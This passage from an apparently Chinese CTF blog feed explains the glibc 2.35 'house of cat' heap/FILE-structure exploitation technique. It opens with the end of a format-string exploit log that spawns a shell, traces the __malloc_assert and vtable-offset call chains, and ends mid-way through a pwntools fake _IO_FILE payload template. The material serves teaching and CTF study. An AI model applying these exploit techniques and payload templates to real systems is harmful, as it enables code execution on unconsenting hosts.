20 20 20  20 20 20 20  20 20 20 05  │    │    │    │   ·│</span><br><span class="line">    00000030  61 61 61 61  68 ae 7a 70  fe 7f                     │aaaa│h·zp│··│</span><br><span class="line">    0000003a</span><br><span class="line">                                               \x05aaaah\xaezp\xfe\x7f$ whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    b&#x27;whoami\n&#x27;</span><br><span class="line">[DEBUG] Received 0x5 bytes:</span><br><span class="line">    b&#x27;r3t2\n&#x27;</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> fmtstr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of cat</title>
      <link href="/2025/09/12/%E5%85%B3%E4%BA%8Ehouse-of-cat/"/>
      <url>/2025/09/12/%E5%85%B3%E4%BA%8Ehouse-of-cat/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>湾区杯被堆题斩于马下，赛后找到powchan的exp，利用堆风水打<code>house of cat</code>，并且相比于板子，更特殊的点就是打<code>stdout</code>并修改<code>mode</code>为**-1**，不需要<code>__malloc_assert</code>、<code>exit</code>或者是<code>fflush</code>来触发。另一个题解则是打<code>libc-got</code><br>姑且先学习一下常规的<code>house of cat</code><br>参考博客</p><ul><li><p><a href="https://bbs.kanxue.com/thread-273895.htm">https://bbs.kanxue.com/thread-273895.htm</a></p></li><li><p><a href="https://nicholas-wei.github.io/2022/08/02/house-of-cat/">https://nicholas-wei.github.io/2022/08/02/house-of-cat/</a></p></li><li><p><a href="https://zikh26.github.io/posts/7de5a5b7.html">https://zikh26.github.io/posts/7de5a5b7.html</a></p></li></ul><p>本文贴出源码无特别提及皆为<code>glibc2.35</code></p><h2 id="0x01-malloc-assert"><a href="#0x01-malloc-assert" class="headerlink" title="0x01 __malloc_assert"></a>0x01 __malloc_assert</h2><p>正常情况下，<code>glibc</code> 的断言失败会走 <code>__assert_fail</code>（在 <code>&lt;assert.h&gt;</code> 里定义）。而在 <code>malloc</code> 的时候，它单独定义了一个版本，走 <code>__malloc_assert</code>，这样方便在 <code>malloc</code> 相关的代码里触发断言时输出更有针对性的错误信息<br>在<code>malloc</code>时遇到分配错误则会触发断言，<code>malloc.c</code>做了如下映射(<code>glibc2.35</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)\</span></span><br><span class="line"><span class="meta"> __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br></pre></td></tr></table></figure><p>而<code>__malloc_assert</code>实现如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看<code>__fxprintf</code>，我们找到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__fxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line">  <span class="type">int</span> res = __vfxprintf (fp, fmt, ap, <span class="number">0</span>);</span><br><span class="line">  va_end (ap);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__vfxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    fp = <span class="built_in">stderr</span>;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="type">int</span> res = locked_vfxprintf (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">locked_vfxprintf</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span></span><br><span class="line"><span class="params">  <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_fwide (fp, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We must convert the narrow format string to a wide one.</span></span><br><span class="line"><span class="comment">     Each byte can produce at most one wide character.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> *wfmt;</span><br><span class="line">  <span class="type">mbstate_t</span> mbstate;</span><br><span class="line">  <span class="type">int</span> res;</span><br><span class="line">  <span class="type">int</span> used_malloc = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (fmt) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (len &gt; SIZE_MAX / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EOVERFLOW);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (__libc_use_alloca (len * <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">    wfmt = alloca (len * <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((wfmt = <span class="built_in">malloc</span> (len * <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>))) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    used_malloc = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span> (&amp;mbstate, <span class="number">0</span>, <span class="keyword">sizeof</span> mbstate);</span><br><span class="line">  res = __mbsrtowcs (wfmt, &amp;fmt, len, &amp;mbstate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (res != <span class="number">-1</span>)</span><br><span class="line">    res = __vfwprintf_internal (fp, wfmt, ap, mode_flags);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (used_malloc)</span><br><span class="line">    <span class="built_in">free</span> (wfmt);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有这样的调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert =&gt; __fxprintf =&gt; __vfxprintf =&gt; locked_vfxprintf =&gt; __vfprintf_internal =&gt; _IO_file_xsputn</span><br></pre></td></tr></table></figure><p>这个<code>__vfprintf_internal</code>就是<code>printf</code>的内部实现<br>这里<code>printf</code>调用<code>_IO_file_xputn</code>其实就是调用<code>vtable</code>函数来调用的<br>而后面的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fflush (<span class="built_in">stderr</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fflush</code>也会调用<code>vtable</code>中的函数 <code>_IO_file_sync</code> (<code>vtable + 0x60</code>)，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert =&gt; fflush(stderr) =&gt; _IO_file_sync (_IO_new_file_sync)</span><br></pre></td></tr></table></figure><p>正是这两条调用链的存在，<code>__malloc_assert</code>可以用于触发 IO 攻击<br>如何触发呢？</p><ul><li><p><code>topchunk</code>的大小小于<code>MINSIZE</code>(<code>0X20</code>)</p></li><li><p><code>topchunk</code>的<code>prev inuse</code>位为0</p></li><li><p><code>old_top</code>页未对齐</p></li></ul><p>最常用的就是修改<code>topchunk</code>的<code>size</code></p><h2 id="0x02-虚表偏移"><a href="#0x02-虚表偏移" class="headerlink" title="0x02 虚表偏移"></a>0x02 虚表偏移</h2><p><a href="https://r3t2.top/2025/07/27/%E5%8A%AB%E6%8C%81vtable%E4%BB%A5%E5%8F%8AFSOP/">此前</a>分析过<code>glibc2.24</code>及以后的<code>vtable</code>检查，这个检查并不是太严格，只需要在<code>__libc_IO_vatables</code>中即可，这一区域不仅仅只有<code>_IO_file_jumps</code>这一个虚表，同时偏移也是我们可以控制的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure><p>以此为例，假设我们一直一条调用链可以调用<code>vtable</code>中的<code>overflow</code>，我们看到偏移为<code>vtable + 0x10</code>，而如果我们修改<code>vtable</code>为<code>vtable + 0x30</code>，那么原先对<code>overflow</code>的调用就会调用到<code>(vtable + 0x30) + 0x10</code>，根据偏移就会调用到<code>seekoff</code><br></p><h2 id="0x03-house-of-cat-原理"><a href="#0x03-house-of-cat-原理" class="headerlink" title="0x03 house of cat 原理"></a>0x03 house of cat 原理</h2><p>前文叙述了<code>__malloc_assert</code>触发后的调用链(通过<code>exit</code>触发也可以，总之找到一个触发 IO 链的方法)，我们更换虚表为<code>_IO_wfile_jumps</code>，再通过虚表偏移，使调用的虚表函数变为<code>seekoff</code>，其定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure><p>无关攻击的部分省去，我们需要的是这里调用<code>_IO_switch_to_wget_mode</code>函数，要满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code><br>其定义如下，同样要满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure><p>我们只关心最前面几行，调用<code>_IO_WOVERFLOW</code>的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span><br></pre></td></tr></table></figure><p> 这个<code>_IO_WOVERFLOW (fp, WEOF)</code>函数是由<code>_IO_FILE_plus</code>结构体的<code>_wide_data</code>字段所指向的<code>_IO_wide_data</code>结构体的<code>_wide_vtable</code>字段所指向的虚表中的函数（这个攻击点和<code>house of apple2</code>是一致的）。在调用<code>_wide_vtable</code>中的函数时<code>_IO_vtable_check</code>并没有检查虚表地址的合法性。<br>而<code>_IO_WOVERFLOW</code>正是<code>_wide_vtable</code>指向虚表偏移<code>0x18</code>处的函数（<code>_wide_vtable</code>字段相对<code>_wide_data</code>偏移为<code>0xe0</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"> </span><br><span class="line">0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>可以看到这段汇编里（<code>glibc2.35</code>），<code>rdi</code>就是传入的<code>_IO_FILE_plus</code>结构体，<code>[rdi+0xa0]</code>正是<code>fp-&gt;_wide_data</code><br>我们可以发现这里我们可以控制到<code>rdx</code>寄存器，那么也就可以打<code>setcontext+61</code>来进行<code>ROP</code>，见<a href="https://r3t2.top/2025/09/03/%E5%9C%A8heap%E4%B8%AD%E8%BF%9B%E8%A1%8CROP/">另一篇</a><br>到这里攻击手法就浮出水面了</p><h2 id="0x04-house-of-cat-攻击手法"><a href="#0x04-house-of-cat-攻击手法" class="headerlink" title="0x04 house of cat 攻击手法"></a>0x04 house of cat 攻击手法</h2><p>总结一下上面的原理，我们需要绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</span><br></pre></td></tr></table></figure><p>然后布置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_WOVERFLOW = call_addr</span><br><span class="line"># 如果要控制rdx</span><br><span class="line">rdx = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;        <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;        <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;       <span class="comment">/* Start of putback + get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;      <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;       <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;       <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;        <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;         <span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;       <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;     <span class="comment">/* Pointer to first valid character of backup area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;        <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;        <span class="comment">/* Conversion state. */</span></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;   <span class="comment">/* Last conversion state. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span>  <span class="comment">/* Character set conversion. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以下是<code>__malloc_assert</code>触发的攻击示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_IO = <span class="string">b&#x27;sh&#x27;</span> <span class="comment"># _flags</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x30</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(rdx) <span class="comment"># rdx = [rax+0x20] / _wide_data-&gt;_IO_write_ptr </span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x40</span> + <span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(call_addr) <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;_IO_WOVERFLOW</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) <span class="comment"># _chain</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(writable_addr) <span class="comment"># _lock 指向可写地址</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_addr + <span class="number">0x30</span>) <span class="comment"># _wida_data</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>) <span class="comment"># _mode = 1</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>] + <span class="number">0x10</span>) <span class="comment"># vtable</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x30</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + 